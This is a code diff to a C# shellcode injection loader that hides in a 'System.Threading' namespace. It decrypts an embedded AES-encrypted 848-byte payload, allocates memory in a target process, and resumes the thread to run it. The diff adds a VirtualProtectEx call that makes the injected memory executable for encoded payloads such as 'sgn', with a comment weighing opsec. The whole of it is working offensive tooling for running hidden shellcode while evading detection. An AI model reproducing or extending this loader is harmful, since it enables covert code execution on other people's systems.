@@ -1,4 +1,5 @@
 ﻿using System.IO;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 
@@ -72,6 +73,9 @@ namespace System.Threading
         static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
 
         [DllImport("kernel32.dll")]
+        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll")]
         static extern IntPtr GetCurrentProcess();
 
         static string DecryptStringFromBytes(byte[] cipherText, byte[] key)
@@ -117,11 +121,13 @@ namespace System.Threading
             }
             //
 
+            bool encoded = false; // If payload is encoded (e.g. sgn) or not sure -> true (less opsec?)
+
             byte[] key = new byte[32] {
                     0xf0,0x59,0xed,0x11,0xe7,0x8d,0x7a,0xaf,0xf6,0xe9,0xb4,0x57,
                     0x10,0x80,0xe2,0xee,0xc3,0x09,0x93,0x6b,0x45,0x2a,0x86,0x09,
                     0x54,0x33,0xb1,0x51,0x06,0x79,0xd8,0x6b
-            };
+};
 
             byte[] buf = new byte[848] {
                     0xa8,0x1f,0xb3,0x8d,0xb5,0xfe,0x4c,0x5a,0xe5,0xee,0x8b,0xb0,
@@ -195,7 +201,7 @@ namespace System.Threading
                     0x94,0xd3,0x57,0x58,0x36,0x66,0x67,0x41,0x24,0x65,0xce,0x79,
                     0xf0,0x5f,0x3d,0xcc,0xc1,0x33,0xb0,0xaf,0x6a,0xd6,0x7f,0x37,
                     0x9e,0x0f,0x23,0xac,0x27,0x2a,0xf4,0x5d,
-            };
+};
 
             string decrypted = DecryptStringFromBytes(buf, key);
 
@@ -266,7 +272,22 @@ namespace System.Threading
                 Console.WriteLine($"[X] Shellcode could not be copied to process 0x{(long)hProcess:X} memory.");
                 return;
             }
-
+            if (encoded)
+            {
+                Console.WriteLine($"[*] Shellcode is encoded. Changing memory protection to EXECUTE_READWRITE to run it...");
+                uint lpflOldProtect;
+                int size = shellcode.Length;
+                res = VirtualProtectEx(hProcess, addressOfEntryPoint, size, 0x40, out lpflOldProtect);
+                if (res)
+                {
+                    Console.WriteLine($"    [+] Success!");
+                }
+                else
+                {
+                    Console.WriteLine($"    [X] Failed!");
+                    return;
+                }
+            }
             ResumeThread(pi.hThread);
             Console.WriteLine($"[+] Resuming thread 0x{(long)pi.hThread:X} in process 0x{(long)hProcess:X}");
         }
